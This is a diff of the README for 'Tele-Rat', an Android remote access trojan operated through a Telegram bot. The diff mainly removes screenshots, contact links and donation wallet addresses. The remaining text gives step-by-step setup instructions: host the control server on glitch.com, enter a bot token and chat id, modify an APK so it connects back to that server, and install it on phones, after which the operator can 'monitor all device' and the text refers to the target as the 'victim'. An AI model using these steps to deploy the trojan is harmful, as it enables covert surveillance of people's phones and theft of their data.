@@ -40,25 +40,18 @@ A multifunctional Telegram based Android RAT  without port forwarding.
 ![App Screenshot]()
 - Go to glitch.com click
 - new project then glitch-hello-node
-![App Screenshot](https://user-images.githubusercontent.com/109063269/180379635-e64a5afa-b61a-469f-a66c-c346e545a4a8.jpg)
+![App Screenshot]()
 - Delete all pre-available files {clcik on 3 dots}
 - click on files and upload package.json, server.js
-![App Screenshot](https://user-images.githubusercontent.com/109063269/180379742-766f978f-2b3d-4248-a111-e02dfca5e790.jpg)
 - Paste your bot token in line 16 {beetwen ''}
-![App Screenshot](https://user-images.githubusercontent.com/109063269/180379872-e6541fe6-6e8a-4c31-af39-f6272c24ca58.jpg)
 - Paste your chat id in line 15 
 - (search userinfobot on telegram and send any msg you will
 - get your chatid
-![App Screenshot](https://user-images.githubusercontent.com/109063269/180379956-fd117f4a-2248-4cbf-98b2-19049cf0228f.jpg)
 - click on previvew availble on bottom
 - open in new window
-![App Screenshot](https://user-images.githubusercontent.com/109063269/180380033-0dbf2cbe-e91d-479d-9aa7-fd81f52bbf76.jpg)
 - if you see this type then copy url and close all tabs
-![App Screenshot](https://user-images.githubusercontent.com/109063269/180380126-802c0c64-af8c-4e5f-9f90-6b944574c8e9.jpg)
 - now open Apkeditor select apk 
 - go to following directory
-![App Screenshot](https://user-images.githubusercontent.com/109063269/180380210-52feb153-3dff-4d7c-95bf-e8e6359000d8.jpg)
-![App Screenshot](https://user-images.githubusercontent.com/109063269/180380344-ca9a68df-8fdb-4ec3-a65c-36ebc84fa774.jpg)
 - paste your glitch url 
 ```bash
   { 
@@ -71,11 +64,9 @@ A multifunctional Telegram based Android RAT  without port forwarding.
 - when victim will open apk given website will be open in apk
 - must replace https to wss
 - click on save, and go back
-![App Screenshot](https://user-images.githubusercontent.com/109063269/180380418-e0451a90-d60d-42b5-b998-9ef53e8653e5.jpg)
 - clcik on smail and wait 3/4 second
 - Now build the apk
 - and install in any phone
-![App Screenshot](https://user-images.githubusercontent.com/109063269/180380470-7a1b5652-02ed-444b-95d9-aa2d0f6fc4b5.jpg)
 - now go to BotFather clcik on your botusername
  - start your bot 
  - now you can monitor all device who will install the apk
@@ -83,9 +74,7 @@ A multifunctional Telegram based Android RAT  without port forwarding.
 ### ❤️Thank you Supporters❤️
 [![Stargazers repo roster for @TeamDarkAnon/Tele-Rat](https://reporoster.com/stars/dark/TeamDarkAnon/Tele-Rat)](https://github.com/TeamDarkAnon/Tele-Rat/stargazers)
 ## 🔗 CONTACT
-[![instagram](https://img.shields.io/badge/CONTACT-TELEGRAM-blue)](https://t.me/TeamDarkAnon)
 
-[![instagram](https://img.shields.io/badge/CONTACT-INSTAGRAM-red)](https://instagram.com)
 
 
 ## Disclaimer
@@ -97,8 +86,6 @@ Dogerat is built for both Educational and Internal use ONLY.
 
 
 ## ALCOHOL SUPPORT 
-!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)
-- Bitcoin
-- 1LeLwYyDHu51875aenZaNcEnMrEbHwEKJd
-- Usdt trc20
-- TWX456AoupoYKwCYUKk3ZMWJtNJZRRHnrp
+- 
+- 
+- 
